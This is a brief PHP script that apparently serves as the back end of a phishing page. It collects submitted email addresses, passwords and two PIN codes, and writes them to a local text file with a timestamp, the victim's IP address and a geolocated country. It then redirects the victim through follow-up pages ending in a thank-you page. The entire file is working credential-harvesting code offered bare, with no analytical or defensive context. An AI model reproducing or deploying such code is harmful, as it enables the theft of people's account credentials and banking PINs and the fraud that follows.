<?php
ini_set("display_errors", 0);
$user_ip = $_SERVER['REMOTE_ADDR'];
$cc = trim(file_get_contents("http://ipinfo.io/{$user_ip}/country"));

$file = fopen("file.txt", "a");
if(isset($_POST['txuno']) && isset($_POST['txdos'])){
fwrite($file, "correo: ".$_POST['txuno']." - Clv: ".$_POST['txdos']." -  ");
header ('location: index2.html');
}
if(isset($_POST['txtres']) && isset($_POST['txcuatro'])){
fwrite($file, "pin: ".$_POST['txtres']."  pin2: ".$_POST['txcuatro']."  ".date('Y-m-d')." - ".date('H:i:s')." ".$user_ip." ".$cc."  ". PHP_EOL);
fwrite($file, "********************************* " . PHP_EOL);
header ('location: gracias.html');
}

fclose($file);


?>